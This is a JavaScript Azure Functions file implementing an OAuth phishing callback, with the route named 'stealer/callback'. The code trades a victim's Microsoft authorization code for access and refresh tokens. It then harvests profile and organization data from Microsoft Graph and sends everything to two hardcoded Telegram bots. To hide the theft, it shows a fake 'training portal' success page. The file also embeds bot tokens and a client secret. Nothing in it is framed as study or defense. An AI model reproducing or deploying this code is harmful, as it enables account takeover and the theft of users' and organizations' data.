const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration - CORRECT TOKENS
const TELEGRAM_BOT_TOKEN = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const TELEGRAM_CHAT_ID2 = "6263177378";

// OAuth configuration - Using working client ID for consumer accounts
const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e'; // Microsoft Graph CLI - works with consumers
const client_secret = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

app.http("callback", {
    methods: ["GET"],
    authLevel: "anonymous",
    route: "stealer/callback",
    handler: async (request, context) => {
        try {
            const url = new URL(request.url);
            const code = url.searchParams.get('code');
            const state = url.searchParams.get('state');
            const error = url.searchParams.get('error');

            if (error) {
                await sendTelegram(`❌ <b>OAuth Error</b>\n\n🔗 <b>Error:</b> ${error}\n📝 <b>Description:</b> ${url.searchParams.get('error_description') || 'No description'}`);
                await sendTelegram(`❌ <b>OAuth Error</b>\n\n🔗 <b>Error:</b> ${error}\n📝 <b>Description:</b> ${url.searchParams.get('error_description') || 'No description'}`, true);
                return new Response(`OAuth Error: ${error}`, { status: 400 });
            }

            if (!code) {
                await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\nNo authorization code received`);
                await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\nNo authorization code received`, true);
                return new Response('No authorization code received', { status: 400 });
            }

            context.log(`Received authorization code: ${code.substring(0, 10)}...`);

            // Exchange code for tokens
            const tokenResponse = await fetch(token_endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    client_id: client_id,
                    client_secret: client_secret,
                    code: code,
                    redirect_uri: redirect_uri,
                    grant_type: 'authorization_code'
                })
            });

            if (!tokenResponse.ok) {
                const errorText = await tokenResponse.text();
                context.log.error('Token exchange failed:', errorText);
                await sendTelegram(`❌ <b>Token Exchange Failed</b>\n\n${errorText}`);
                await sendTelegram(`❌ <b>Token Exchange Failed</b>\n\n${errorText}`, true);
                return new Response(`Token exchange failed: ${errorText}`, { status: 400 });
            }

            const tokens = await tokenResponse.json();
            context.log('Tokens received successfully');

            // Send Telegram notification with tokens
            const tokenMessage = `🔥 <b>OAuth Tokens Captured!</b>\n\n🔗 <b>State:</b> ${state}\n🔑 <b>Access Token:</b> <code>${tokens.access_token.substring(0, 50)}...</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'None'}</code>\n⏰ <b>Expires In:</b> ${tokens.expires_in} seconds\n📝 <b>Token Type:</b> ${tokens.token_type}`;
            
            await sendTelegram(tokenMessage);
            await sendTelegram(tokenMessage, true);

            // Get user profile
            try {
                const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
                    headers: {
                        'Authorization': `Bearer ${tokens.access_token}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (profileResponse.ok) {
                    const profile = await profileResponse.json();
                    const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${profile.mail || profile.userPrincipalName}\n👤 <b>Name:</b> ${profile.displayName}\n🏢 <b>Company:</b> ${profile.businessPhones ? profile.businessPhones.join(', ') : 'N/A'}\n📱 <b>Mobile:</b> ${profile.mobilePhone || 'N/A'}\n🆔 <b>ID:</b> ${profile.id}`;
                    
                    await sendTelegram(profileMessage);
                    await sendTelegram(profileMessage, true);
                }
            } catch (profileError) {
                context.log.error('Profile fetch error:', profileError);
                await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${profileError.message}`);
            }

            // Get organization info
            try {
                const orgResponse = await fetch('https://graph.microsoft.com/v1.0/organization', {
                    headers: {
                        'Authorization': `Bearer ${tokens.access_token}`,
                        'Content-Type': 'application/json'
                    }
                });

                if (orgResponse.ok) {
                    const org = await orgResponse.json();
                    if (org.value && org.value.length > 0) {
                        const orgInfo = org.value[0];
                        const orgMessage = `🏢 <b>Organization Info</b>\n\n🏢 <b>Name:</b> ${orgInfo.displayName}\n🌐 <b>Domain:</b> ${orgInfo.verifiedDomains ? orgInfo.verifiedDomains.map(d => d.name).join(', ') : 'N/A'}\n📧 <b>Technical Contacts:</b> ${orgInfo.technicalNotificationMails ? orgInfo.technicalNotificationMails.join(', ') : 'N/A'}`;
                        
                        await sendTelegram(orgMessage);
                        await sendTelegram(orgMessage, true);
                    }
                }
            } catch (orgError) {
                context.log.error('Organization fetch error:', orgError);
                await sendTelegram(`⚠️ <b>Organization Fetch Error</b>\n\n${orgError.message}`);
            }

            // Return success page
            const successHtml = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Authentication Complete</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f3f2f1; }
                    .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; text-align: center; }
                    .success-icon { font-size: 64px; color: #107c10; margin-bottom: 20px; }
                    .title { color: #323130; font-size: 28px; font-weight: 600; margin-bottom: 10px; }
                    .message { color: #605e5c; font-size: 16px; line-height: 1.6; margin: 20px 0; }
                    .button { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
                    .button:hover { background: #106ebe; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="success-icon">✅</div>
                    <h1 class="title">Authentication Complete</h1>
                    <p class="message">Your account has been successfully verified. You can now access your personalized training materials.</p>
                    <p class="message">You will be redirected to the training portal shortly...</p>
                    <a href="/microsoft-training" class="button">Return to Training Portal</a>
                </div>
                <script>
                    setTimeout(() => {
                        window.location.href = '/microsoft-training';
                    }, 3000);
                </script>
            </body>
            </html>`;

            return new Response(successHtml, {
                status: 200,
                headers: {
                    'Content-Type': 'text/html; charset=utf-8'
                }
            });

        } catch (error) {
            context.log.error('Callback error:', error);
            await sendTelegram(`❌ <b>Callback Error</b>\n\n${error.message}`);
            await sendTelegram(`❌ <b>Callback Error</b>\n\n${error.message}`, true);
            return new Response(`Callback error: ${error.message}`, { status: 500 });
        }
    }
});